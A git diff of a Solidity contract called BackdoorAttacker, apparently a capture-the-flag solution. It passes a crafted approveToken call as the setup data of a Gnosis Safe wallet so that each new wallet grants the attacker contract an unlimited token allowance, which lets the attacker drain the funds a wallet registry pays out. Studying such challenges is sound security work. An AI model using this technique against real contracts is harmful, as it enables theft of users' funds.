@@ -23,20 +23,8 @@ contract BackdoorAttacker {
     attacker = payable(msg.sender);
   }
   
-  /*function setup(
-        address[] calldata _owners,
-        uint256 _threshold,
-        address to,
-        bytes calldata data,
-        address fallbackHandler,
-        address paymentToken,
-        uint256 payment,
-        address payable paymentReceiver
-    )
-  */
-  
-  function approveToken(address spender) external {
-    token.approve(spender, 2**256 - 1);
+  function approveToken(address tokenAddr, address spender) external {
+    IERC20(tokenAddr).approve(spender, 2**256 - 1);
   }
   
   function exploit() external {
@@ -61,7 +49,7 @@ contract BackdoorAttacker {
         master,
         abi.encodeWithSelector(
           GnosisSafe.setup.selector,
-          arr, 1, address(this), abi.encodeWithSignature("approveToken(address)", address(this)), address(walletRegistry), 0, 0, 0
+          arr, 1, address(this), abi.encodeWithSignature("approveToken(address,address)", address(token), address(this)), address(walletRegistry), 0, 0, 0
         ),
         0,
         walletRegistry
